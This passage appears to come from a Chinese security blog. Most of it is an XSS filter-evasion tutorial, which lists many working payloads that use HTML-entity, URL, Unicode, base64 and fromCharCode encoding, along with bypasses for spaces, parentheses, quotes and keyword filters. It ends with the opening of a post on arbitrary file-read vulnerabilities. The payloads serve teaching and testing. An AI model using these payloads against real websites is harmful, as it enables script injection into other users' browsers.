<h3 id="7-1、编码绕过"><a href="#7-1、编码绕过" class="headerlink" title="7.1、编码绕过"></a>7.1、编码绕过</h3><p>浏览器对 XSS 代码的解析顺序为：<strong>HTML解码 —— URL解码 —— JS解码(只支持UNICODE)</strong>—&gt;”<a>XXXX</a>“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">浏览器</span><br><span class="line">&lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">--》&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>编码：javascript:alert(1)–》js编码–》url(javascript:%61%6c%65%72%74%28%31%29)–&gt;html()–&gt;paload					</p>
<p>解码–》html–&gt;url–&gt;js–&gt;得到结果进行网页显示</p>
<h4 id="0x01-html-实体编码"><a href="#0x01-html-实体编码" class="headerlink" title="0x01. html 实体编码"></a>0x01. html 实体编码</h4><p><strong>当可控点为单个标签属性时，可以使用 html 实体编码。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;可控点&quot;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;可控点&quot;&gt;test&lt;iframe&gt;</span><br><span class="line">&lt;img src=x onerror=&quot;可控点&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>Payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>十进制</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>十六进制</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>可以不带分号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3a&amp;#x61&amp;#x6c&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x31&amp;#x29&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>可以填充0</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;&amp;#x006a&amp;#x0061&amp;#x0076&amp;#x0061&amp;#x0073&amp;#x0063&amp;#x0072&amp;#x0069&amp;#x0070&amp;#x0074&amp;#x003a&amp;#x0061&amp;#x006c&amp;#x0065&amp;#x0072&amp;#x0074&amp;#x0028&amp;#x0031&amp;#x0029&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x02-url-编码"><a href="#0x02-url-编码" class="headerlink" title="0x02. url 编码"></a>0x02. url 编码</h4><p><strong>当注入点存在 href 或者 src 属性时，可以使用 url 编码。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;可控点&quot;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;可控点&quot;&gt;test&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<p><strong>Payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;test&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<p><strong>注：url 解析过程中，不能对协议类型进行任何的编码操作，所以 javascript: 协议头需要保留。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;test&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<p><strong>可以二次编码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:%2561%256c%2565%2572%2574%2528%2531%2529&quot;&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;javascript:%2561%256c%2565%2572%2574%2528%2531%2529&quot;&gt;test&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>





<h4 id="0x03-js-编码"><a href="#0x03-js-编码" class="headerlink" title="0x03. js 编码"></a>0x03. js 编码</h4><p><strong>解析的时候字符或者字符串仅会被解码为字符串文本或者标识符名称，</strong></p>
<p><strong>例如 js 解析器工作的时候将<code>\u0061\u006c\u0065\u0072\u0074</code>进行解码后为<code>alert</code>，而<code>alert</code>是一个有效的标识符名称，它是能被正常解析的。</strong></p>
<p><strong>但是像圆括号、双引号、单引号等等这些字符就只能被当作普通的文本，从而导致无法执行。</strong></p>
<p><strong>由于 js 是最后进行解析的，所以如果混合编码，需要先使用 js 编码再进行 url 编码或者 html 实体编码。</strong></p>
<p><strong>js 编码策略：</strong></p>
<ol>
<li>“&quot; 加上三个八进制数字，如果个数不够，前面补0，例如 “&lt;” 编码为 “\074”</li>
<li>“\x” 加上两个十六进制数字，如果个数不够，前面补0，例如 “&lt;” 编码为 “\x3c”</li>
<li>“\u” 加上四个十六进制数字，如果个数不够，前面补0，例如 “&lt;” 编码为 “\u003c”</li>
<li>对于一些控制字符，使用特殊的 C 类型的转义风格（例如 \n 和 \r）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;可控点&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus=location=&quot;可控点&quot; autofocus&gt; </span><br></pre></td></tr></table></figure>

<p><strong>Payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus=location=&quot;alert(1)&quot; autofocus&gt; </span><br></pre></td></tr></table></figure>

<p><strong>Unicode 编码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus=location=&quot;javascript:\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029&quot; autofocus&gt; </span><br></pre></td></tr></table></figure>

<p><strong>注：</strong></p>
<p><strong>Unicode 编码时，只能对有效的标识符进行编码，否则非标识符解码后不能解析执行。</strong></p>
<p><strong>例如 javascript:alert(1) ，进行 Unicode 编码时，只能对 alert 和 “1” 进行编码，框号编码后会被当成文本字符，不能执行。</strong></p>
<p>ascii 八进制和十六进制编码使用时需要 eval、setTimeout等函数传递变量，并且可以对整个传递参数进行编码。</p>
<p>例如 </p>
<p>eval(“alert(1)”)，可以对 “alert(1)” 整个进行八进制、十六进制或者 Unicode 编码(双引号不参与)。**</p>
<p><strong>八进制和十六进制</strong></p>
<p>setTimeout() 是属于 window 的方法，该方法用于在指定的毫秒数后调用函数或计算表达式。</p>
<p>语法：<code>setTimeout(要执行的代码, 等待的毫秒数)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setTimeout(JavaScript 函数, 等待的毫秒数)</span><br><span class="line">1.&lt;svg/onload=setTimeout(&#x27;\x61\x6C\x65\x72\x74\x28\x31\x29&#x27;)&gt;</span><br><span class="line">2.&lt;svg/onload=setTimeout(&#x27;\141\154\145\162\164\050\061\051&#x27;)&gt;</span><br><span class="line">3.&lt;svg/onload=setTimeout(&#x27;\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029&#x27;)&gt;</span><br><span class="line">4.&lt;script&gt;eval(&quot;\x61\x6C\x65\x72\x74\x28\x31\x29&quot;)&lt;/script&gt;</span><br><span class="line">5.&lt;script&gt;eval(&quot;\141\154\145\162\164\050\061\051&quot;)&lt;/script&gt;</span><br><span class="line">6.&lt;script&gt;eval(&quot;\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>







<h4 id="0x04-混合编码"><a href="#0x04-混合编码" class="headerlink" title="0x04. 混合编码"></a>0x04. 混合编码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;可控点&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>Payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>html 编码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>Unicode 编码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:\u0061\u006c\u0065\u0072\u0074(1)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>注：Unicode 编码不能对括号使用</strong></p>
<p><strong>url 编码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>由于浏览器对 xss 代码的解析过程是：html解析 —— url解析 —— js解析，所以可以编码方式进行组合绕过。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 原代码</span><br><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br><span class="line">2. 对alert进行JS编码（unicode编码）</span><br><span class="line">&lt;a href=&quot;javascript:\u0061\u006c\u0065\u0072\u0074(1)&quot;&gt;test&lt;/a&gt;</span><br><span class="line">3. 对href标签中的\u0061\u006c\u0065\u0072\u0074进行URL编码</span><br><span class="line">&lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)&quot;&gt;test&lt;/a&gt;</span><br><span class="line">4. 对href标签中的javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)进行HTML编码：</span><br><span class="line">&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>注：href、src等加载url的属性可以使用三种混合编码，on事件可以使用html实体编码和js编码混合，但url编码在on事件中不会解析。</strong></p>
<h4 id="0x05-base64-编码"><a href="#0x05-base64-编码" class="headerlink" title="0x05. base64 编码"></a>0x05. base64 编码</h4><p><strong>base64 编码通常需要使用到 data 伪协议。</strong></p>
<p><strong>data 协议使用方法：<code>data:资源类型;编码,内容</code></strong></p>
<p>base64编码内容为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=</span><br></pre></td></tr></table></figure>

<p>通常与 base64 编码配合 data 协议的标签有 <strong><object>、<a>、<iframe></strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.&lt;object&gt; 标签</span><br><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;</span><br><span class="line"></span><br><span class="line">2.&lt;a&gt; 标签</span><br><span class="line">&lt;a href=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;test&lt;/a&gt;   （新版浏览器不支持）</span><br><span class="line"></span><br><span class="line">3.&lt;iframe&gt; 标签</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">4.&lt;embed&gt; 标签</span><br><span class="line">&lt;embed src=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/embed&gt;</span><br></pre></td></tr></table></figure>

<p><strong>atob 函数</strong></p>
<p>atob() 方法用于解码使用 base-64 编码的字符串。</p>
<p>语法：<code>window.atob(encodedStr)</code>(encodedStr: 必需，是一个通过 btoa() 方法编码的字符串)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.&lt;a href=javascript:eval(atob(&#x27;YWxlcnQoMSk=&#x27;))&gt;test&lt;/a&gt;</span><br><span class="line">2.&lt;a href=javascript:eval(window.atob(&#x27;YWxlcnQoMSk=&#x27;))&gt;test&lt;/a&gt;</span><br><span class="line">3.&lt;a href=javascript:eval(window[&#x27;atob&#x27;](&#x27;YWxlcnQoMSk=&#x27;))&gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">4.&lt;img src=x onmouseover=&quot;eval(window.atob(&#x27;YWxlcnQoMSk=&#x27;))&quot;&gt;</span><br><span class="line">5.&lt;img src=x onerror=&quot;eval(atob(&#x27;YWxlcnQoMSk=&#x27;))&quot;&gt;</span><br><span class="line">6.&lt;iframe src=&quot;javascript:eval(window[&#x27;atob&#x27;](&#x27;YWxlcnQoMSk=&#x27;))&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>





<h4 id="0x06-ascii-编码"><a href="#0x06-ascii-编码" class="headerlink" title="0x06. ascii 编码"></a>0x06. ascii 编码</h4><p>ascii 编码一般配合<code>String.fromCharCode</code>使用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(1)xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">十进制：97, 108, 101, 114, 116, 40, 49, 41</span><br><span class="line">十六进制：0x61, 0x6C, 0x65, 0x72, 0x74, 0x28, 0x31, 0x29</span><br></pre></td></tr></table></figure>

<p><strong>十进制</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&#x27;javascript:eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))&#x27;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>十六进制</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&#x27;javascript:eval(String.fromCharCode(0x61, 0x6C, 0x65, 0x72, 0x74, 0x28, 0x31, 0x29))&#x27;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>







<h3 id="7-2、空格过滤绕过"><a href="#7-2、空格过滤绕过" class="headerlink" title="7.2、空格过滤绕过"></a>7.2、空格过滤绕过</h3><html><img**AA**src**AA**onerror**BB**=**BB**alert**CC**(1)**DD**></html>

<p>A位置可填充 &#x2F;，&#x2F;123&#x2F;，%09，%0A，%0C，%0D，%20 </p>
<p>B位置可填充 %09，%0A，%0C，%0D，%20 </p>
<p>C位置可填充 %0B，&#x2F;**&#x2F;，</p>
<p>如果加了双引号，则可以填充 %09，%0A，%0C，%0D，%20</p>
<p> D位置可填充 %09，%0A，%0C，%0D，%20，&#x2F;&#x2F;，&gt;</p>
<h3 id="7-3、圆括号过滤绕过"><a href="#7-3、圆括号过滤绕过" class="headerlink" title="7.3、圆括号过滤绕过"></a>7.3、圆括号过滤绕过</h3><h4 id="0x01-反引号替换"><a href="#0x01-反引号替换" class="headerlink" title="0x01. 反引号替换"></a>0x01. 反引号替换</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert`1`&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x02-throw-绕过"><a href="#0x02-throw-绕过" class="headerlink" title="0x02. throw 绕过"></a>0x02. throw 绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;video src onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;</span><br><span class="line">&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;</span><br></pre></td></tr></table></figure>



<h3 id="7-4、单引号过滤绕过"><a href="#7-4、单引号过滤绕过" class="headerlink" title="7.4、单引号过滤绕过"></a>7.4、单引号过滤绕过</h3><h4 id="0x01-斜杠替换"><a href="#0x01-斜杠替换" class="headerlink" title="0x01. 斜杠替换"></a>0x01. 斜杠替换</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x02-反引号替换"><a href="#0x02-反引号替换" class="headerlink" title="0x02. 反引号替换"></a>0x02. 反引号替换</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(`xss`)&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h3 id="7-5、alert-过滤绕过"><a href="#7-5、alert-过滤绕过" class="headerlink" title="7.5、alert 过滤绕过"></a>7.5、alert 过滤绕过</h3><h4 id="0x01-prompt-替换"><a href="#0x01-prompt-替换" class="headerlink" title="0x01. prompt 替换"></a>0x01. prompt 替换</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;prompt(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x02-confirm-替换"><a href="#0x02-confirm-替换" class="headerlink" title="0x02. confirm 替换"></a>0x02. confirm 替换</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;confirm(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x03-console-log-替换"><a href="#0x03-console-log-替换" class="headerlink" title="0x03. console.log 替换"></a>0x03. console.log 替换</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;console.log(3)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x04-document-write-替换"><a href="#0x04-document-write-替换" class="headerlink" title="0x04. document.write 替换"></a>0x04. document.write 替换</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.write(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x05-base64-绕过"><a href="#0x05-base64-绕过" class="headerlink" title="0x05. base64 绕过"></a>0x05. base64 绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;Function`a$&#123;atob`YWxlcnQoMSk=`&#125;```&quot;&gt;</span><br><span class="line">&lt;img src=x onerror=&quot;``.constructor.constructor`a$&#123;atob`YWxlcnQoMSk=`&#125;```&quot;&gt;</span><br></pre></td></tr></table></figure>





<h3 id="7-6、关键词置空绕过"><a href="#7-6、关键词置空绕过" class="headerlink" title="7.6、关键词置空绕过"></a>7.6、关键词置空绕过</h3><h4 id="0x01-大小写绕过"><a href="#0x01-大小写绕过" class="headerlink" title="0x01. 大小写绕过"></a>0x01. 大小写绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>可以转换为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;ScRiPt&gt;AlErT(/xss/)&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x02-双写绕过"><a href="#0x02-双写绕过" class="headerlink" title="0x02. 双写绕过"></a>0x02. 双写绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">嵌套&lt;script&gt;和&lt;/script&gt;突破</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>可以转换为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/sc&lt;/script&gt;ript&gt;</span><br></pre></td></tr></table></figure>



<h3 id="7-7、函数拼接"><a href="#7-7、函数拼接" class="headerlink" title="7.7、函数拼接"></a>7.7、函数拼接</h3><h4 id="0x01-eval"><a href="#0x01-eval" class="headerlink" title="0x01. eval"></a>0x01. eval</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;al&#x27;+&#x27;ert(1)&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x02-top"><a href="#0x02-top" class="headerlink" title="0x02. top"></a>0x02. top</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x03-window"><a href="#0x03-window" class="headerlink" title="0x03. window"></a>0x03. window</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;window[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x04-self"><a href="#0x04-self" class="headerlink" title="0x04. self"></a>0x04. self</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;self[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x05-parent"><a href="#0x05-parent" class="headerlink" title="0x05. parent"></a>0x05. parent</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;parent[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x06-frames"><a href="#0x06-frames" class="headerlink" title="0x06. frames"></a>0x06. frames</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;frames[`al`+`ert`](1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="0x07-常用函数"><a href="#0x07-常用函数" class="headerlink" title="0x07. 常用函数"></a>0x07. 常用函数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;open(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;document.write(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setTimeout(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setInterval(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Set.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Map.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Array.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;WeakSet.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;constructor.constructor(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].map(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].find(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].every(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].filter(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].forEach(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].findIndex(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>



<h3 id="7-8、赋值拼接"><a href="#7-8、赋值拼接" class="headerlink" title="7.8、赋值拼接"></a>7.8、赋值拼接</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src onerror=_=alert,_(1)&gt;</span><br><span class="line">&lt;img src x=al y=ert onerror=top[x+y](1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src onerror=top[a=&#x27;al&#x27;,b=&#x27;ev&#x27;,b+a](&#x27;alert(1)&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src onerror=[&#x27;ale&#x27;+&#x27;rt&#x27;].map(top[&#x27;ev&#x27;+&#x27;al&#x27;])[0][&#x27;valu&#x27;+&#x27;eOf&#x27;]()(1)&gt;</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>任意文件读取与下载</title>
    <url>/2023/05/03/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E4%B8%8B%E8%BD%BD/</url>
    <content><![CDATA[<h2 id="任意文件读取与下载"><a href="#任意文件读取与下载" class="headerlink" title="任意文件读取与下载"></a>任意文件读取与下载</h2><h4 id="为什么产生任意文件读取与下载漏洞"><a href="#为什么产生任意文件读取与下载漏洞" class="headerlink" title="为什么产生任意文件读取与下载漏洞"></a>为什么产生任意文件读取与下载漏洞</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞.</span><br></pre></td></tr></table></figure>

<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、存在读文件的函数</span><br><span class="line">2、读取文件的路径用户可控且未校验或校验不严</span><br><span class="line">3、输出了文件内容</span><br></pre></td></tr></table></figure>

<h4 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下载服务器任意文件，如脚本代码、服务及系统配置文件等</span><br><span class="line">可用得到的代码进一步代码审计，得到更多可利用漏洞</span><br></pre></td></tr></table></figure>

